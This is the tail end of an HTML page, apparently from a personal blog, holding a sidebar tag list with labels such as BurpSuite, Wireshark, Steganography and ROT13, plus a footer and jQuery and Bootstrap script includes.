    <a href="http://bt3gl.github.io/tag/pdftotext.html">
        <i class="icon-tag icon-large"></i>pdftotext
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/mysql.html">
        <i class="icon-tag icon-large"></i>MySQL
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/binary_search.html">
        <i class="icon-tag icon-large"></i>Binary_Search
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/burpsuite.html">
        <i class="icon-tag icon-large"></i>BurpSuite
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/nop.html">
        <i class="icon-tag icon-large"></i>NOP
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/javascript.html">
        <i class="icon-tag icon-large"></i>JavaScript
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/xor.html">
        <i class="icon-tag icon-large"></i>XOR
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/bash.html">
        <i class="icon-tag icon-large"></i>Bash
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/pygenere.html">
        <i class="icon-tag icon-large"></i>pygenere
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/tr.html">
        <i class="icon-tag icon-large"></i>tr
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/wireshark.html">
        <i class="icon-tag icon-large"></i>Wireshark
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/steganography.html">
        <i class="icon-tag icon-large"></i>Steganography
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/c.html">
        <i class="icon-tag icon-large"></i>C
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/decimal.html">
        <i class="icon-tag icon-large"></i>Decimal
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/php.html">
        <i class="icon-tag icon-large"></i>PHP
    </a>
</li>
<li class="tag-3">
    <a href="http://bt3gl.github.io/tag/rot13.html">
        <i class="icon-tag icon-large"></i>ROT13
    </a>
</li>
<li class="tag-4">
    <a href="http://bt3gl.github.io/tag/ftp.html">
        <i class="icon-tag icon-large"></i>FTP
    </a>
</li>


</ul>

        </div><!--/.well -->

      </div><!--/row-->



      <footer>
        <address id="about">

        </address><!-- /#about -->

      </footer>

    </div><!--/.fluid-container-->


    <script src="http://bt3gl.github.io/theme/js/jquery-1.7.2.min.js"></script>
    <script src="http://bt3gl.github.io/theme/js/bootstrap.min.js"></script>
  </body>
</html>